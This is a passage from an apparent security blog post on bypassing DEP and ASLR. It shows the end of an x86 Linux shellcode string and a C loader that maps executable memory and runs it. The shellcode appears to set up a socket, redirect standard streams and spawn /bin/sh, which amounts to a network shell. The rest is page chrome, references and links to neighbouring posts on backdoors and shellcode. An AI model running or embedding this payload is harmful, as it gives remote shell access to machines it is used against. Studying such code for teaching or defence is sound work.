<span class="s">&quot;</span><span class="se">\x66\x58\x43\x31\xd2\x52\x52\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31</span><span class="s">&quot;</span>
<span class="s">&quot;</span><span class="se">\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
 
    <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span>
            <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_ANON</span>
            <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
    <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&quot;mmap&quot;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
 
    <span class="n">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">sc</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">ptr</span><span class="p">;</span>
 
    <span class="p">(</span><span class="kt">void</span><span class="p">)((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">ptr</span><span class="p">)();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
 
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>

<p>Github: https://github.com/P0cL4bs/HeapExecShellcode</p>
<pre>
Referências:
https://samsclass.info/127/proj/rop.htm
http://www.intelligentexploit.com/articles/Return-Oriented-Programming-(ROP-FTW).pdf
http://phrack.org/issues/62/5.html
</pre>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#linux-ref">
					linux <span>(1)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#DEP-ref">
					DEP <span>(1)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#ASLR-ref">
					ASLR <span>(1)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#bypass-ref">
					bypass <span>(1)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#windows-ref">
					windows <span>(3)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#linux-ref">
					linux <span>(5)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Bypass Windows e Linux + metasploit [DEP ASLR]&via=mh4x0f"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
        <h4 class="section-title author-name">mh4x0f</h4>
        <p class="author-bio">One 0x41414141 worth a thousand words</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/assembly/2014/08/24/writing-backdoor-in-ASM-linux-64-bits-sycall-Netcat.html" title="writing backdoor in ASM linux 64 bits sycall Netcat">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/assembly/2014/11/13/Shellcode-64-Bits-Assembly-Language-Developing-%5BASM%5D.html" title="Shellcode 64 ASM Language Developing">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>



    
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'mh4x0fblog';

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>





		<footer>
			<hr/>
			<p>
				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  var _gaq = _gaq || [];
  var pluginUrl =
 '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
  _gaq.push(['_setAccount', 'mh4x0f']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

